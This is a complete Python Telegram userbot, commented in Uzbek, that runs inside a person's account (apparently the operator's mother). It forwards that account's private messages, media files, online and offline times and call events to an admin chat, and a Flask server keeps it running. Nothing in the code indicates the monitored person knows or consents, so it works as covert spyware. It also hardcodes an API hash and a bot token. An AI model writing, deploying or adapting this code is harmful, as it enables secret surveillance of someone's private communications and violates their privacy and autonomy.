import asyncio
import os
from datetime import datetime
from threading import Thread
from flask import Flask
from pyrogram import Client, filters, enums, errors

# --- FLASK SERVER (UptimeRobot uchun) ---
app = Flask('')

@app.route('/')
def home():
    return "Bot tirik va ishlamoqda!"

def run():
    # Render odatda 10000 yoki 8080 portni talab qiladi, 
    # lekin ko'p hollarda os.environ orqali olish xavfsizroq
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# --- SOZLAMALAR ---
API_ID = 35663408
API_HASH = "325eb6b36e381572872beb835adb08b5"
BOT_TOKEN = "8261048532:AAHpMXKiv28OGTzR7qAU5Q16MtRVSZ6w4kk"
ADMIN_ID = 5699159876 

# Sessiya fayllari uchun yo'lni belgilash (Render fayl tizimi uchun)
userbot = Client("mom_session", api_id=API_ID, api_hash=API_HASH)
report_bot = Client("report_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

last_status = {}
online_start_time = {}

def get_user_link(user):
    if not user: return "Noma'lum"
    name = user.first_name or "Profil"
    return f"[{name}](tg://user?id={user.id})"

# 1. ONLINE / OFFLINE Monitoring
@userbot.on_user_status()
async def status_monitor(client, user_status):
    me = await client.get_me()
    if user_status.id == me.id:
        await asyncio.sleep(2) 
        fresh_status = await client.get_users("me")
        current_state = "online" if fresh_status.status == enums.UserStatus.ONLINE else "offline"

        if last_status.get(me.id) != current_state:
            last_status[me.id] = current_state
            now = datetime.now()

            if current_state == "online":
                online_start_time[me.id] = now
                await report_bot.send_message(ADMIN_ID, f"🟢 **Onangiz Telegramga kirdi.**\n⏰ Vaqt: `{now.strftime('%H:%M:%S')}`")
            else:
                start = online_start_time.get(me.id)
                duration = f"\n⏱ Davomiyligi: `{int((now - start).total_seconds() // 60)}` daqiqa." if start else ""
                await report_bot.send_message(ADMIN_ID, f"🔴 **Onangiz Telegramdan chiqdi.**\n⏰ Vaqt: `{now.strftime('%H:%M:%S')}`{duration}")

# 2. ASOSIY MONITORING
@userbot.on_message(filters.all)
async def handle_everything(client, message):
    try:
        me = await client.get_me()
        chat_name = message.chat.title or message.chat.first_name or "Chat"

        if message.service:
            call_text = ""
            if message.video_chat_started or message.voice_chat_started:
                call_text = "📞 **Qo'ng'iroq boshlandi...**"
            elif message.video_chat_ended or message.voice_chat_ended:
                m = message.video_chat_ended or message.voice_chat_ended
                call_text = f"🏁 **Qo'ng'iroq yakunlandi.**\n⏱ Davomiyligi: `{m.duration}` soniya"

            if call_text:
                await report_bot.send_message(ADMIN_ID, f"{call_text}\n📍 Chat: `{chat_name}`")
                return

        is_mom_writing = message.from_user and message.from_user.id == me.id
        is_private = message.chat.type == enums.ChatType.PRIVATE
        is_mention_or_reply = message.mentioned or (message.reply_to_message and message.reply_to_message.from_user and message.reply_to_message.from_user.id == me.id)

        if is_mom_writing or is_private or is_mention_or_reply:
            status_icon = "➡️" if message.outgoing else "📩"
            status_text = "ONANGIZ YOZDI" if message.outgoing else "ONANGIZGA KELDI"
            sender_link = get_user_link(message.from_user)

            info_block = (
                f"\n\n----------\n"
                f"🔔 **{'MATN' if message.text else 'MEDIA'}**\n"
                f"📍 Chat: `{chat_name}`\n"
                f"👤 Kim: {sender_link}\n"
                f"🔄 Holat: {status_icon} {status_text}"
            )

            if message.text:
                await report_bot.send_message(ADMIN_ID, f"{message.text}{info_block}")
            else:
                file_path = await message.download()
                cap = f"{message.caption or ''}{info_block}"

                if message.photo: await report_bot.send_photo(ADMIN_ID, file_path, caption=cap)
                elif message.voice: await report_bot.send_voice(ADMIN_ID, file_path, caption=cap)
                elif message.video: await report_bot.send_video(ADMIN_ID, file_path, caption=cap)
                elif message.video_note:
                    await report_bot.send_message(ADMIN_ID, f"📹 **DUMALOQ VIDEO**{info_block}")
                    await report_bot.send_video_note(ADMIN_ID, file_path)
                else: await report_bot.send_document(ADMIN_ID, file_path, caption=cap)

                if os.path.exists(file_path): os.remove(file_path)

    except errors.FloodWait as e:
        await asyncio.sleep(e.value)
    except Exception as e:
        print(f"Xatolik: {e}")

async def run_system():
    await userbot.start()
    await report_bot.start()
    print("✅ Monitoring faol va Flask server ishga tushdi.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    # Flaskni alohida thread'da ishga tushiramiz
    keep_alive()
    
    # Asosiy bot loopini ishga tushiramiz
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run_system())
